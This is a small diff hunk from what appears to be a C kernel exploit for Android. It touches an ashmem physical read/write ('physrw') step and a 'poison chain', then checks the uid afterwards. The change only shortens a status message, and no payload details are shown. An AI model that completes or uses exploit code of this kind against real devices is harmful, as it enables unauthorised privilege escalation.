@@ -199,7 +199,7 @@ static void scan_pipe_soft(int cfd) {
     close(cfd);
     return 6;
   }
-  printf("[+] physrw installed - poison chain\n");
+  printf("[+] physrw installed\n");
   int rc = run_poison_chain();
   printf("[*] run_poison_chain ret=%d uid=%d\n", rc, getuid());
   uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
